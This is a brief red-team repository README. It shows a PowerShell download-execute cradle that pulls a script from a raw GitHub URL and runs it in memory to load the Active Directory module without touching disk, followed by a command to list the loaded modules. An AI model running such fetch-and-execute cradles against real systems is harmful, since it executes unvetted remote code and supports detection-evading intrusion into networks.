# RedTeamStuffs
A collection of Red Team tools and stuff that have come in handy

# Native AD Module
Use a download-execute cradle to load the Microsoft.ActiveDirectory.Management.dll (RSAT) from within Import-ActiveDirectory.ps1 without writing it to disk. 

iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/RCStep/RedTeamStuffs/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory

To list all loaded modules:
PS> Get-Command -Module \*ActiveDirectory\*

From: https://github.com/samratashok/ADModule/tree/master
